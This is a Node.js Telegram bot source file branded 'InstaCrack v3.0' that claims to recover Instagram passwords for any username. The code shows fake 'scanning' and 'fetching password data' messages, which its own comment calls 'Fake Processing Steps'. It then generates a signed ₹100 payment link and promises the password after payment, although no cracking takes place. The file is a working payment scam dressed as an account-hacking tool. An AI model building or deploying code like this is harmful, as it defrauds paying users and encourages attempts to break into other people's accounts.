const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

require('dotenv').config();

// Setup bot
const token = process.env.TELEGRAM_BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

// Welcome Message
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
🔐 *Welcome to InstaCrack v3.0*  
Hello ${msg.from.first_name}!

I can help you unlock Instagram passwords for fun!  
Type /crack <username> to begin.
    `, { parse_mode: 'Markdown' });
});

// Crack Command
bot.onText(/\/crack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1].trim().toLowerCase();

    if (!username) {
        return bot.sendMessage(chatId, "⚠️ Please provide a valid Instagram username.");
    }

    // Fake Processing Steps
    bot.sendMessage(chatId, `🔍 Scanning database for @${username}...`);
    await new Promise(r => setTimeout(r, 2000));
    bot.sendMessage(chatId, `🔄 Verifying account details...`);
    await new Promise(r => setTimeout(r, 2000));
    bot.sendMessage(chatId, `⚡ Fetching password data...`);
    await new Promise(r => setTimeout(r, 2000));

    // Generate Order ID
    const orderId = `ORD${Math.floor(Date.now() / 1000)}`;
    const amount = 100;

    // Generate X-VERIFY
    const requestData = {
        customer_mobile: 9999999999,
        merch_id: process.env.FASTZIX_MERCHANT_ID,
        amount: amount,
        order_id: orderId,
        currency: "INR",
        redirect_url: `${process.env.WEBAPP_URL}/success?username=${encodeURIComponent(username)}`,
        udf1: username,
        udf2: "InstaPass",
        udf3: "UnlockTool",
        udf4: "WebAppV2",
        udf5: "DemoOnly"
    };

    const sortedKeys = Object.keys(requestData).sort();
    const dataString = sortedKeys.map(k => `${k}=${requestData[k]}`).join('|');
    const secretKey = process.env.FASTZIX_API_KEY;
    const xVerify = crypto.createHmac('sha256', secretKey)
                         .update(dataString)
                         .digest('hex');

    // Simulate payment link generation
    const paymentLink = `${process.env.WEBAPP_URL}/payment?username=${encodeURIComponent(username)}`;

    bot.sendMessage(chatId, `
✅ Done! To view the password for *${username}*,
please complete a small verification.

Pay ₹100 using the link below:
🔗 [Proceed to Payment](${paymentLink})
    `, { parse_mode: 'Markdown' });
});
